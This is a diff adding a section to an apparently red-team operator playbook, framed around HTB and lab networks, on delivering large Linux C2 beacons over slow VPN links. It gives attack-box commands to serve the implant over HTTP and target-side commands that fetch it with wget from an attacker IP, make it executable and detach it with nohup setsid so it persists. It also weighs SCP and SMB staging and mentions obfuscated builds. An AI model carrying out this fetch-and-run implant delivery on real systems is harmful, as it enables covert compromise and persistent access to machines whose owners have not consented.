@@ -144,3 +144,51 @@ If the target has an **SMB share** or **FTP** that the operator can write to
 > Note: pool builds (`pool-https-win32`) are normally obfuscated and will exceed
 > the delivery limit on Win2003/XP. Keep a separate slim build in the pool when
 > working legacy targets, or generate one on demand and remove it after use.
+
+## Large beacon delivery over low-bandwidth VPN (HTTP wget)
+
+SCP transfers of large (>10 MB) beacon ELFs stall at ~200 KB/s over the HTB /
+lab VPN and frequently fail mid-transfer. For 30 MB Linux beacons on a slow VPN
+link, **HTTP download is significantly faster and more reliable** than SCP.
+
+### Why HTTP is faster
+
+SCP runs over the SSH channel's flow-control, which is a single stream with a
+relatively small window. A Python HTTP server + `wget` on the target uses direct
+TCP at full VPN throughput with automatic retry and no per-byte SSH overhead.
+
+### Server side (attack box)
+
+Serve from the directory containing the beacon ELF:
+
+```bash
+# in the directory where the beacon lives
+python3 -m http.server 8080
+```
+
+The server stays running until killed (`Ctrl+C`). Confirm the address is your
+VPN interface (e.g. `tun0`, `10.10.14.x`).
+
+### Target side (Linux)
+
+```bash
+# download, mark executable, and detach
+wget http://10.10.14.5:8080/beacon -O /tmp/beacon
+chmod +x /tmp/beacon
+nohup setsid /tmp/beacon </dev/null >/dev/null 2>&1 &
+```
+
+Combine with the `nohup setsid` detachment pattern so the beacon survives the
+delivery shell closing (see Linux — SSH / mosh delivery above).
+
+### When to use SCP vs HTTP
+
+| Beacon size | Link | Recommendation |
+|---|---|---|
+| < 5 MB | Any | SCP fine — fast enough and simpler |
+| 10-30 MB | HTB / lab VPN | HTTP wget preferred — SCP unreliable |
+| Any size | Target has no outbound TCP | Stage via SMB/FTP share or Meterpreter TLV |
+
+> **Note:** The HTTP server exposes the beacon on the attack box's VPN IP to the
+> whole lab subnet for the duration of the transfer. Shut it down promptly once
+> the download completes.
